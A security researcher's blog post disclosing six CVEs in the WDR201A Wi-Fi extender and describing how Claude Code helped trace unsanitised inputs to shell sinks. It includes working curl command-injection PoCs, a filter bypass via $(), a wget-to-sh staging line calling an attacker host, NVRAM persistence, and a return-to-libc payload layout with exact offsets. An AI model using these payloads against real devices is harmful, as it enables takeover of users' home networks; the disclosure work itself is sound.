---
layout: post
title: "Teaching the Machine Where to Look: Scaling Embedded Vulnerability Research with AI"
date: 2026-05-04
author: Matteo Strada (mstreet)
categories: [security-research, iot, vulnerability-disclosure, ai-assisted-research, cybersecurity, cve]
tags: [CVE, IoT, embedded, firmware, reverse-engineering, Ghidra, Claude, command-injection, buffer-overflow]
---


This research started as a simple evening session with my colleague and friend Daniele Berardinelli (check out his blog [here](https://berardinellidaniele.com/)), looking at the cheap consumer Wi-Fi extender I had already tested before (in case you missed it, the first part is [available here](https://mstreet97.github.io/security-research/iot/vulnerability-disclosure/cybersecurity/cve/2026/02/18/From-Blackbox-to-Whitebox-Multiple-CVEs-in-a-Consumer-WiFi-Extender.html)).
The goal wasn't particularly ambitious, just to explore the attack surface more in depth and see what else could be found.

A few hours later, we had multiple command injection vulnerabilities, and after a while more, I realized that these vulnerabilities were following a specific pattern.
At that point, the problem shifted from finding bugs to scaling their discovery, teaching the machine where to look.

The initial findings and the final Stack-Based BoF were identified together with Daniele, while the subsequent pattern-driven analysis and exploitation work were carried out individually.

---

## Why this device and what I had going in

The WDR201A is a circa 15 euro Wi-Fi extender sold under several white-label brands. The SoC is MediaTek MT7628NN, the firmware is tiny, around 4 MB compressed, and ships a lighttpd web server with several CGI binaries for its configuration and operation.

<div align="center">
    <img src="/assets/images/multiple_cves_in_wifi_extender/front.jpg" style="width:60%;">
</div>

To recap, these are the hardware info:
- Device type: Consumer WiFi Extender
- Manufacturer: Shenzhen Yuner Yipu Trading Co., Ltd
- Hardware platform: WDR201A
- Hardware revision: V2.1
- Firmware version: LFMZX28040922V1.02

I had already dumped the firmware in a previous pass via UART + U-Boot (both unprotected on this device, documented separately as CVE-2026-30704 in the part one of this research). So this phase started from an on-disk copy of the root filesystem, with all binaries available for static analysis.

What I wanted this phase to produce was a systematic sweep of **every** (ok, that sounds like too much, let's say **most**) command injection vectors in the CGI layer, not just one or two. The previous black-box pass had surfaced `adm.cgi set_sys_cmd` (CVE-2026-30703) from a combo of response fuzzing and binary reversing, so I wanted to find the rest.

## The architecture: one sink function, many callers

Every CGI binary on this device dynamically links two libraries:

```bash
$ readelf -d firewall.cgi | grep NEEDED
  (NEEDED)  Shared library: [libwebutil.so]
  (NEEDED)  Shared library: [libc.so.0]
```

`libwebutil.so` exports the two functions that matter for this audit:

- `web_get(key, body, flag)` - URL-form-decodes the POST body, returns the value for `key`
- `do_system(fmt, ...)` - printf's its arguments into a static buffer, then passes it to `system()`

Both functions are called from every CGI binary. The question "where can an attacker inject shell metacharacters?" reduces almost entirely to the question "where does a `web_get()` return value flow into a `do_system()` format argument without sanitization?"

## The Manual way

This is where Daniele and I started to manually look into the target CGIs. The initial manual analysis went relatively smooth, though it quickly became clear how time-consuming this approach would be at scale.

Three of the ten findings turned out to be command injections with **no sanitization at all** between `web_get` and `do_system`. The exploits work with a literal semicolon with no shell tricks needed. Listed here roughly in order of how we encountered them.

### Finding 1: wireless.cgi - sz11gChannel (page=basic) and PIN (page=WPS)

Decompilation of `set_wifi_basic` yielded this:

```c
pcVar1 = (char *)web_get("sz11gChannel", param_2, 1);
pcVar5 = strdup(pcVar1);
if (*pcVar5 != '\0') {
    nvram_bufset(0, "Channel", pcVar5);
    do_system("iwpriv ra0 set Channel=%s", pcVar5);
}
```

Nothing between `strdup` and `do_system`. `pcVar5` is handed to `do_system()` as the `%s` argument, and gets executed.

A PoC is as follows:
```bash
curl -s -X POST http://TARGET-IP/cgi-bin/wireless.cgi \
  -d "page=basic&sz11gChannel=1;ping -c 7 ATTACKER-IP;&wirelessmode=9&mssid_0=x& \
  passphrase=x&hssid=0&n_bandwidth=0&n_extcha=0&wifihiddenButton=1& \
  security_mode=Disable&reloadpage=wifi-statusc.shtml"
```

The lone constraint is that `strdup(pcVar5)[0] != '\0'`, i.e. the first byte of the attacker value must be non-empty, which is easily taken care of.

We also found a second injection point in the WPS settings, specifically the PIN parameter:
```C
char *pin = web_get("PIN", query_string, 0);
do_system("iwpriv %s set WscPinCode=%s", iface_buf, pin);
```

The PoC is, of course, similar to the one above, but simpler as there are less parameters:
```bash
curl -s -X POST http://DEVICE-IP/cgi-bin/wireless.cgi \
    -d "page=WPS&PINPBCRadio=1&PIN=12345678;ping -c 7 ATTACKER-IP"
```

Assigned CVE: CVE-2026-41922 **OS Command Injection in wireless.cgi**

### Finding 2: internet.cgi - gateway (page=addrouting)

`set_add_routing` builds an `ip route add` command and passes it to `popen`:

```c
pcVar4 = (char *)web_get("gateway", param_1, 1);
pcVar4 = strdup(pcVar4);
snprintf(acStack_528, 0x100, "%s gw %s", acStack_528, pcVar4);
__stream = popen(acStack_528, "r"); 
```

The useful property here is that `internet.cgi` reads the output of `popen` and reflects it back into the HTTP response as "Add routing failed: %s". So this injection actually shows the stdout/stderr of the injected command in the HTTP body. Very convenient for debugging PoCs without needing the usual OOB extraction.

```bash
curl -s -X POST http://TARGET-IP/cgi-bin/internet.cgi \
  -d "page=addrouting&hostnet=host&dest=192.168.200.1&\
  netmask=255.255.255.255&gateway=1.1.1.1;id 1>&2;&interface=LAN&\
  custom_interface=&comment=test"
```

The `1>&2` redirects `id`'s output to stderr, which `popen` captures along with stdout, and the CGI relays it to the attacker.

Assigned CVE: CVE-2026-41923 **OS Command Injection in internet.cgi**

## Methodology: tracing parameters backwards from the sinks

Now ok, this has been fun for a couple of evenings but we were getting tired of looking manually for the same vulnerabilities. I realised that all the found OS Command injections were following the same pattern and the original objective was to uncover as many vulnerabilities as possible. I thought this was the perfect occasion to test Claude Code capabilities. The reasoning was to specifically define the pattern I wanted to look for in the remaining binaries, come up with a strategy, explain it to Claude and see what it could do.

The most efficient way that came to my mind to hunt for these vulnerabilities, was not having Claude read every function but rather to look for the execution sinks and walk backwards, tracing the execution back to the injection points. For each CGI binary I instructed Claude to do as follows:

1. Enumerate all call sites of `do_system` (and `popen`, `execve`, `system`).
2. For each call site, look at how the format string's `%s` arguments are populated.
3. If an argument traces back to a `web_get()` call, check whether any sanitization step (whitelist regex, `strchr` blacklist, IP/MAC format validator) intercepts it between `web_get` and the sink.
4. Note the dispatch mechanism: which handler runs depends on a dispatch key parsed from the POST body. Different CGIs use different keys.

Visually it looks like this:
<div align="center">
    <img src="/assets/images/teaching_the_machine_where_to_look/attack_methodology.png" style="width:80%;">
</div>

After prompting Claude with these requirements, I set up a VM with Ghidra, radare and the needed tools. Claude wrote a headless Jython script that automated steps 1 and 2: it walks every binary, finds the call sites of do_system/popen/system/execve, decompiles each calling function, and extracts both the source functions referenced (web_get, getenv, fgets...) and the literal format strings present. Steps 3 and 4, sanitization detection and dispatch-key identification, required reading the decompiled C and were done manually with the JSON output as a guide. 

Of course, the outputs were to be manually checked as to avoid false positives and validated against the actual hardware.
Let's see what else it found.

### Finding 3: adm.cgi - reboot_time (page=reboot_time)

Let's start out from the standard, the exact pattern that Daniele and I found. Claude had no issue in replicating it.

`reboot_time`, the name is, well, self-explanatory:
```c
char *sched = strdup(web_get("reboot_time", query_string, 1));
nvram_bufset(0, "reboot_time", sched);
if (atoi(enabled) == 1) {                            // reboot_enabled=1 gate
    snprintf(buf, 0x80, "crond.sh %s  &", sched);   
    do_system(buf);                                 
}
```

The sink is gated behind `reboot_enabled=1`. Without that parameter the sink is skipped and nothing shell-interpretable runs.

The PoC, also looks similar to Findings 1 and 2:
```bash
curl -s -X POST http://TARGET-IP/cgi-bin/adm.cgi \
-d "page=reboot_time&reboot_enabled=1&reboot_time=10:00;ping -c 7 ATTACKER-IP"
```

Claude found it, I confirmed it on the actual hardware. The experiment was working!

As a bonus in this case, since it's again adm.cgi, the output gets weirdly reflected in the HTTP response. Much like page=sysCMD of CVE-2026-30703. Why this happens is still beyond me, though I stand by my theories of the original post. Anyhow, it gives a nicer way of seeing the command output, as can be seen here:

<div align="center">
    <img src="/assets/images/teaching_the_machine_where_to_look/command-injection-adm-cgi-reboot-time.png" style="width:80%;">
</div>

Assigned CVE: CVE-2026-41925 **OS Command Injection in adm.cgi**

### Finding 4 aka the non-standard dispatch: makeRequest.cgi

What about "non standard" requests? Or something that diverges from the pattern I told Claude?

Every other CGI on this firmware dispatches requests on a `page=<name>` parameter (the standard HTTP Body key=value pair): `wireless.cgi` looks at `page`, `internet.cgi` looks at `page`, `adm.cgi` looks at `page`, etc. `makeRequest.cgi` is different.

Its `main()` calls:

```c
get_nth_value(0, body, '&', token);
if (strcmp(token, "set_time") == 0) set_time(body);
else if (strcmp(token, "sniffer_start") == 0) StartSniffer(body);
```

The handler name is the **first &-separated token of the POST body**, not a named parameter. So to call `set_time` you send `set_time&...` as the body, where the `...` is the token that becomes the handler's argument. And `set_time` is particularly short:

```c
void set_time(undefined4 param_1)
{
    do_system("date -s %s", param_1); 
}
```

No sanitization, no length check, no wrapping.

```bash
curl -s -X POST http://TARGET-IP/cgi-bin/makeRequest.cgi \
  --data-binary "set_time&2024; ping -c 7 ATTACKER-IP"
```

One small nuance: `get_nth_value` caps the extracted token at 31 bytes (`max_size=0x20` in the call site). The usable injection window is thus very short at 31 bytes total, including the legitimate prefix. It's limited but enough for a working PoC, or to trigger a staging via `wget`:

```bash
set_time&2024;wget ATTACKER-IP/x.sh|sh
```

This took a bit of back and forth. Claude initially found the sink by looking for the usual pattern, but disregarded it because of the limited payload length, and for the "strange" request body. Upon manual investigation, by looking at the actual HTTP requests, I simply instructed Claude about the body parameters structure. It then adapted its pattern and caught this vulnerability as well.

Assigned CVE: CVE-2026-41924 **OS Command Injection in makeRequest.cgi**

### Finding 5 aka the surprise: firewall.cgi dispatches on a different key

Now let’s put everything together: non standard web dispatches and some sort of sanitization. 

On `firewall.cgi`, the natural thing to try was sending `page=portForward`, assuming the dispatch was the same as every other CGI. The handler never matched and every request returned an empty 500. For a while I thought the handlers were unreachable from outside, but it didn't seem the case given the previous results.

The decompilation explained it:

```c
// firewall.cgi main 
pcVar3 = (char *)web_get("firewall", acStack_230, 0);  // The key is "firewall" not "page"
// ...
iVar2 = strcmp(pcVar3, "portForward");
if (iVar2 == 0) { portForward(acStack_230); goto exit; }
```

`firewall.cgi` dispatches on a parameter literally named `firewall`. Every other CGI dispatches on `page`. This is the kind of tiny inconsistency that costs hours when you assume the codebase is uniform. 

Five vulnerabilities live inside `firewall.cgi`, each in a different handler of the `firewall` dispatch. They divide into two groups.

### Handlers with no sanitization

`singlePortForward` and `ipportFilter` accept attacker input with zero filtering. Semicolons work directly.

```bash
# singlePortForward via ip_address
curl -s -X POST http://TARGET-IP/cgi-bin/firewall.cgi \
  -d 'firewall=singlePortForward&singlePortForwardEnabled=1& \
  ip_address=1.1.1.1;ping -c 7 ATTACKER-IP&publicPort=9090&\
  privatePort=90&protocol=tcp&comment=x'

# ipportFilter via sip_address
curl -s -X POST http://TARGET-IP/cgi-bin/firewall.cgi \
  -d 'firewall=ipportFilter&sip_address=1.1.1.1;ping -c 7 ATTACKER-IP& \
  dip_address=0.0.0.0&mac_address=&protocol=tcp&sFromPort=0&sToPort=0& \
  dFromPort=0&dToPort=0&action=1&comment=x'
```

### Handlers with a strchr(';')-only filter

`websURLFilter`, `websHostFilter`, and `portForward` each apply a single `strchr` blacklist:

```c
pcVar7 = (char *)web_get("addURLFilter", acStack_230, 1);
if ((pcVar7 == NULL) || (strchr(pcVar7, 0x3b) != NULL))   // blocks ';'
    goto exit;
nvram_bufset(0, "websURLFilters", pcVar7);
```

The intent was obvious: block semicolons to prevent command injection. Of course this is insufficient, and I can bypass it with the classic `$()` subshell substitution:

```bash
curl -s -X POST http://TARGET-IP/cgi-bin/firewall.cgi \
  --data-binary 'firewall=websURLFilter&addURLFilter=1.1.1.1$(ping -c 7 ATTACKER-IP)'
```

Same bypass works against `websHostFilter` (`addHostFilter`). `portForward` additionally blocks `,` but `$()` still clears that bar.

Once again, Claude was able to diverge from the given pattern just enough to catch these differences and signal them to me for the validation against the hardware.

### Persistence: NVRAM-backed re-execution

What Claude couldn't catch (but I did eheh) it's a detail that renders `firewall.cgi`'s vulnerabilities particularly nasty: each of these five handlers stores the attacker value into **NVRAM** before calling the iptables runner. Walking through `websURLFilter`:

```c
nvram_bufset(0, "websURLFilters", pcVar7);   // persist to NVRAM
nvram_commit(0);                             // commits
iptablesWebsFilterRun();                     // read from NVRAM straight to do_system
```

And the sink, `iptablesWebsFilterRun`, iterates the stored values on every invocation:

```c
do_system("iptables -A web_filter -p tcp -m tcp -m webstr --url %s "
          "-j REJECT --reject-with tcp-reset", rule);
```

A single successful command injection is sufficient to write the payload to NVRAM. The payload re-executes every time any request hits `firewall.cgi`, because `main()` always calls `iptablesWebsFilterRun()` in its initialization block regardless of which handler was dispatched. In practice this gives an implicit persistence as the first request plants the payload but every subsequent request to any firewall.cgi handler re-runs it.

Here is a visualization of the persistence mechanism:
<div align="center">
    <img src="/assets/images/teaching_the_machine_where_to_look/persistence_mechanism.png" style="width:80%;">
</div>

To clean up after testing, one needs to send a follow-up request with an empty value for the corresponding NVRAM key, or the payload keeps firing on every firewall.cgi hit until the device is factory-reset.

Assigned CVE: CVE-2026-41926 **OS Command Injection in firewall.cgi**

### Validation on hardware

Now, enough for the theory and let's see some PoCs in practice. I will show only a subset of the PoCs, as most payloads are duplicates, but rest assured that all exploits were validated against the hardware. 

For the out of band injections, this was the expected result:

```bash
# on the attacker laptop, 192.168.188.100, set up a listener:
sudo tcpdump -i eth0 'icmp and host 192.168.188.100' -nn -v
```

<div align="center">
    <img src="/assets/images/teaching_the_machine_where_to_look/makerequest_poc.png" style="width:80%;">
</div>

For the in band injections:
<div align="center">
    <img src="/assets/images/teaching_the_machine_where_to_look/internet_poc.png" style="width:80%;">
</div>


## But wait, there's more (Beyond injections): Stack-based buffer overflow

While brainstorming for other ideas to try out, Daniele suggested a potential dangerous pattern in a CGI's `main()` function:

```c
pcVar5 = getenv("CONTENT_LENGTH");
__size = lVar2 + 1;
if ((__size == 0x7fffffff) || ...) {
    pcVar5 = malloc(__size);
    memset(pcVar5, 0, __size);
    fgets(pcVar5, __size, stdin);
```

His hypothesis was an integer-overflow-into-heap-overflow:

1. Send `Content-Length: 2147483646` (`0x7FFFFFFE`) → `__size = 0x7FFFFFFF`. A naive `__size == 0x7fffffff` check would trip, but because of the `||` shape it can potentially be bypassed down the alternate branch.
2. Even better, send `Content-Length: -1` → `atoi("-1") = -1` → `__size = 0` → `malloc(0)` returns a tiny chunk → `fgets` writes the full body into a 0-sized buffer, trashing the heap.

An integer wrap into unbounded write pattern that was definitely worth checking even if we were unsure on how to weaponize it.

### What the decompilation actually looks like

The hypothesis Daniele described holds. The `||` bypass he sketched does exist on this firmware: at the start of `wireless.cgi`'s main(), the disassembly shows `beq s1, 0x7FFFFFFF, malloc_path`, an explicit short-circuit that lets a `Content-Length` of 2147483646 skip the negative/zero rejection checks and fall straight through to `malloc(s1)`. That is a textbook integer-overflow primitive. 

What kills it on this device is the next instruction. After `malloc`, the code does `beqz v0, error`, a NULL check. The bypass route asks the allocator for ~2 GB on a MediaTek MT7628NN that ships with 64 MB of RAM. The allocation always fails, the NULL check catches it, and `fgets` never runs. The bug is real in theory but the hardware budget makes it un-reachable. 

The second leg of his idea (`Content-Length: -1` → `s1 = 0` → `malloc(0)`) returning a tiny chunk that subsequent `fgets` overflows fails on a different detail. The relevant compare is `blez s1`, not `bltz`: it rejects zero as well as negative values, so the path to `malloc(0)` is closed. 

This whole analysis applies to the three CGIs that share the `malloc(strtol+1)` pattern: `wireless.cgi`, `internet.cgi`, and `adm.cgi`. The bypass is there but unfortunately the chain is unreachable on the hardware.

When I opened `firewall.cgi` and `makeRequest.cgi` in Ghidra though to validate the hypothesis, the decompilation at `main()` looked structurally similar but **different in an important way**:

```c
pcVar3 = getenv("CONTENT_LENGTH");
if (pcVar3 == NULL) pcVar3 = "";
lVar4 = strtol(pcVar3, NULL, 10);
if (lVar4 + 1 < 2) {
    /* error branch */
    goto exit;
}
memset(acStack_230, 0, 0x200);       // 512-byte stack buffer
fgets(acStack_230, lVar4 + 1, stdin);
```

Three things immediately jumped out:

- The bound check is a single `lVar4 + 1 < 2`, i.e. `Content-Length >= 1`. There is no `== 0x7FFFFFFF` comparison and no `||`-branch trick to exploit. The integer-overflow bypass Daniele described is not present in this particular binary.
- The destination of `fgets` is **not** the return value of `malloc(size)`. It's `acStack_230`, a fixed 512-byte buffer allocated on the stack.
- The size argument to `fgets` is still `lVar4 + 1`, i.e. attacker-controlled via `CONTENT_LENGTH`, which does not have an upper bound limit, hence the bug.

Funnily enough, this was not exactly the pattern we were initially looking for, but it turned out to be a much simpler and more dangerous bug. A direct, unbounded `fgets` into a fixed-size stack buffer. No arithmetic gymnastics needed. Just send a body larger than 512 bytes.

So Daniele's tip was wrong in the specifics, but right in the instinct: *something is off about how these binaries handle CONTENT_LENGTH*. Following that thread is what led to the actual bug.

**Why only those two?** The five CGIs clearly share the same skeleton `main()`, same variable names, same helper calls, same `/dev/console` debug print. But someone, at some point, modified three of them to allocate dynamically and left the other two untouched (or vice versa). There's no deep reason why `firewall.cgi` and `makeRequest.cgi` specifically were left vulnerable, it's the natural consequence of inconsistent maintenance.

### Computing the RA offset from the disassembly

To turn "`fgets` overwrites stack memory" into "attacker controls `$ra`", I needed the exact distance from the start of the buffer to the saved return address. r2 on the `main()` prologue gave me the frame layout:

```
addiu sp, sp, -0x268              ; frame is 0x268 bytes
sw s0, 0x240(sp)
sw a1, 0x238(sp)
sw ra, 0x264(sp)
sw fp, 0x260(sp)
sw s7..s1 at 0x25c..0x244(sp)
```

With the buffer starting at `sp + 0x38`, the layout inside `main()`'s frame looks like this:

| Slot | Offset from `sp` | Offset from buffer start |
|---|---|---|
| `acStack_230` (buffer) | `sp + 0x38` | 0 |
| end of buffer (512 B) | `sp + 0x238` | 512 |
| saved `a1` | `sp + 0x238` | 512 |
| saved `s0` | `sp + 0x240` | 520 |
| saved `s6` | `sp + 0x258` | **544** |
| saved `s7` | `sp + 0x25c` | 548 |
| saved `fp` | `sp + 0x260` | 552 |
| **saved `$ra`** | **`sp + 0x264`** | **556** |

So the 556th byte of the POST body lands exactly on the first byte of saved `$ra`. For `makeRequest.cgi` the arithmetic differs slightly - buffer at `sp + 0x40`, frame `0x258`, saved `ra` at `sp + 0x254` → RA offset = 532.

To visualize better, here's a schema of the stack:
<div align="center">
    <img src="/assets/images/teaching_the_machine_where_to_look/stack_layout.png" style="width:80%;">
</div>

### Confirming the offset empirically: the sweep test

Before crafting a weaponized payload, I wanted to see the bug misbehave on real hardware, at the exact predicted byte. The cleanest way to do that is to fix a baseline request that produces deterministic output, then pad it with `A`'s up to a varying total length and watch for a discontinuity.

For `firewall.cgi` the baseline is:

```bash
firewall=DMZ&DMZEnabled=0&DMZAddress=0.0.0.0&DMZTCPPort80=0&pad=
```

The DMZ handler eventually calls `web_redirect()`, which emits a `Status: 302` header, so a well-formed request returns `HTTP/1.1 302 Found`. Padding the body up to a given total size while keeping the handler-identifying prefix intact lets us isolate the effect of stack corruption on the handler's behavior.

A simple loop that sends increasingly bigger requests to the CGI should be able to trigger the crash. And in fact, the following output was returned:

```bash
[...]
size=500-552:  HTTP/1.1 302 Found       ← baseline intact
size=556:      FLIP → HTTP/1.1 200 OK   ← exactly RA offset (byte 556)
size=560-700:  HTTP/1.1 200 OK          ← stack smashed
[...]
```

The transition at **byte 556** is precisely the RA offset the static analysis predicted. 

The 302 → 200 (empty) behavior has an elegant explanation:

1. `web_redirect()` has already written `Status: 302\nLocation: ...\n` into the process's stdio buffer (block-buffered, 4 KB).
2. The handler falls through to `LAB_004013a8` → `nvram_close(0)` → `return 0`.
3. Function epilogue: `lw ra, 0x264(sp); jr ra; addiu sp, sp, 0x268`.
4. `jr ra` with `ra = 0x41414141` (from our `A` padding) → SIGSEGV.
5. The process dies without flushing stdio → lighttpd receives no CGI output → defaults to `HTTP 200 OK, Content-Length: 0`.

So the "HTTP 200" response is, paradoxically, evidence of a crash: if the CGI had returned normally, it would have flushed its buffered 302.

### Proving $ra is attacker-controlled

The sweep establishes that byte 556 is special, but to claim full control of `$ra` we need direct kernel-level evidence. MIPS Linux will print a register dump on SIGSEGV if `print-fatal-signals` is enabled.

On the device (via telnet, as root, thanks to the previously discovered OS Command injections):

```sh
echo 1 > /proc/sys/kernel/print-fatal-signals
cat /proc/kmsg
```

From the attacker, I triggered the BoF with the use of a helper script and a random value for `$ra`:

```bash
python3 cgi_bof.py --host 192.168.188.1 ra 0xcafebabe
```

The kernel dumps this to `/proc/kmsg` for each crash (example for the `0xcafebabe` case):

<div align="center">
    <img src="/assets/images/teaching_the_machine_where_to_look/bof-crash1.png" style="width:70%;">
</div>

Reading this output:

- `firewall.cgi/15194` - the crashing process is indeed the CGI we targeted (PID 15194).
- `$16..$23 = 0x41414141` - callee-saved registers `s0..s7` were restored from our `A` padding at function epilogue. All eight were successfully corrupted.
- `$28` row - `gp, sp, fp, ra`. The last word, saved `$ra`, carries the attacker value.
- `epc : 0xcafebabe` - Exception PC, i.e. the address the CPU was trying to fetch when the MMU failed. It equals the value the attacker injected into the RA slot, byte-for-byte.
- `BadVA : cafebabe` - the faulting virtual address.

### Attempting weaponization - return-to-libc

With `$ra` under control, the next step is a classic MIPS return-to-libc. uClibc 0.9.33.2 at offset `0x3a4e8` contains a textbook gadget found by Daniele thanks to his expertise in exploit development:

```
addiu a0, sp, 0x18     ; a0 = sp + 0x18 (points to a stack location)
addiu a1, zero, 1
move t9, s6            ; t9 = s6 (callee-saved, attacker-controlled)
jalr t9                ; call t9(a0, a1, a2)
move a2, s7            ; delay slot
```

Since `$s6` is a callee-saved register, it gets restored from the attacker's overflow at `main()`'s epilogue. So the recipe is:

- Set `$s6` = `&system` in libc
- Set `$ra` = `&gadget` in libc
- Place a NULL-terminated shell command at `buffer + 0x248` (byte 584), the offset that corresponds to `sp + 0x18` at gadget entry after `main()`'s delay-slot `addiu sp, sp, 0x268`.

When `main()` returns:

1. The epilogue restores `s6 = &system` and `ra = &gadget`, then executes `jr ra; addiu sp, sp, 0x268`.
2. Control transfers to the gadget. `sp` has already been incremented, and `addiu a0, sp, 0x18` computes the address of the command string in the overflow.
3. `jalr t9` calls `system(cmd)` with `t9 = &system`.
4. `system` spawns `/bin/sh -c cmd`.

The payload layout, byte by byte:

| byte range | content |
|---|---|
| 0–64 | baseline: `firewall=DMZ&DMZEnabled=0&...&pad=` |
| 65–543 | `A` padding |
| 544–547 | saved `$s6` = `&system` (LE) |
| 548–555 | `A` padding (spills onto `$s7` and `$fp` slots, values don't matter for this chain) |
| 556–559 | saved `$ra` = `&gadget` (LE) |
| 560–583 | `A` padding (spills into caller frame, irrelevant) |
| 584–608 | shell command, e.g. `ping -c 7 ATTACKER-IP` |
| 609 | NUL terminator |

### Why the RCE is fragile: libc base varies per process

Theory: clean. Practice: less so.

uClibc 0.9.33.2 on this device does not ship with hard-disabled ASLR. The kernel can randomize the mmap base, which means libc is not at a fixed offset across process invocations. During testing I observed three distinct libc bases on the same device, in quick succession:

- `firewall.cgi` launched manually from a telnet shell: `libc @ 0x2baaf000`
- `firewall.cgi` spawned by lighttpd, first boot: `libc @ 0x2b315000`
- `firewall.cgi` spawned by lighttpd, after a reboot: `libc @ 0x2acf3000`

With `libc_base` leaked live from the target CGI process (via `/proc/<pid>/maps` extracted via telnet access achieved via a backdoor implant through a command injection), the full chain fired exactly once: seven ICMP echo-requests reached my `tcpdump` listener.

PoC or it didn't happen:
<div align="center">
    <img src="/assets/images/teaching_the_machine_where_to_look/bof-rce1.png" style="width:80%;">
</div>

Subsequent attempts with a freshly-leaked base did not reproduce. The most likely reason is that the leaking CGI process and the exploiting CGI process are both children of lighttpd, but the kernel's mmap allocator can assign each child a slightly different layout depending on transient kernel state. 

Achieving reliable RCE on this target would require an **info-leak primitive** chained in the same request as the BoF, so that the library base used to compute `&system` and `&gadget` is observed from within the same process that is about to execute the payload. We did not develop that leak, and so the end-to-end RCE remains "demonstrated once, not reliably reproducible".

What is reliably reproducible, to the byte, is the stack overflow, the overwrite of saved `$ra`, and the kernel-logged proof of control-flow hijack. That is what this finding ultimately stands on.

Assigned CVE: CVE-2026-41927 **Stack-based Buffer Overflow (firewall.cgi, makeRequest.cgi)**

---

## Key takeaways and closing thoughts

Aside from the actual hunt for vulnerabilities, this research was particularly interesting for me because it was the first time I decided to integrate AI into the pipeline. Starting manually, identifying a replicable and reliable pattern to use for the hunt is what enabled the use of AI to automate the discovery. It allowed me to switch from "can I find another bug?" to "how do I find all of them?"

So what was the contribution of AI? Once given a precise pattern to match, it surfaced and triaged candidate sinks at a very fast rate. Each candidate still required human validation against the hardware before claiming a finding, but the surfacing step, the thing that scaled, was AI-driven (once the pattern was clear). What it did not do was define the pattern in the first place: the manual phase with Daniele was where the abstraction emerged.


---

## CVEs

| CVE | Description | Attack Vector | CVSS |
|-----|------------|---------------|-----|
| CVE-2026-41922 | OS Command Injection (wireless.cgi) | Network | 9.3 |
| CVE-2026-41923 | OS Command Injection (internet.cgi) | Network | 9.3 |
| CVE-2026-41924 | OS Command Injection (makeRequest.cgi) | Network | 9.3 |
| CVE-2026-41925 | OS Command Injection (adm.cgi) | Network | 9.3 |
| CVE-2026-41926 | OS Command Injection (firewall.cgi) | Network | 9.3 |
| CVE-2026-41927 | Stack-based Buffer Overflow (firewall.cgi, makeRequest.cgi) | Network | 8.3 |

These are in addition to CVE-2026-30701-4 described [in the first part of the research](https://mstreet97.github.io/security-research/iot/vulnerability-disclosure/cybersecurity/cve/2026/02/18/From-Blackbox-to-Whitebox-Multiple-CVEs-in-a-Consumer-WiFi-Extender.html)

---

## Responsible Disclosure

This research was conducted on hardware purchased and owned by the author, in a controlled lab environment. No third-party systems, networks, or devices were tested or affected.
Given the absence of a security contact, PSIRT, or disclosure policy from the manufacturer, and the fact that the device is sold under multiple white-label brands with no clear maintenance path, public disclosure is intended to inform owners of affected devices and the broader security community. CVE assignment was coordinated with VulnCheck, whose support in the disclosure process is gratefully acknowledged.
Affected firmware version: LFMZX28040922V1.02 (WDR201A V2.1). At the time of publication, no patched firmware is publicly available. Users of this device or its white-label variants should treat the web management interface as untrusted and not expose it to untrusted networks.


Disclosure timeline:
- 2026-02-01: Initial contact attempt to the vendor (Shenzhen Yuner Yipu Trading Co., Ltd) at the only public email address available.
- 2026-04-15: No acknowledgment received.
- 2026-04-24: CVE IDs requested through VulnCheck (CNA).
- 2026-04-27: CVE IDs assigned: CVE-2026-41922 through CVE-2026-41927.
- 2026-05-04: Public disclosure.

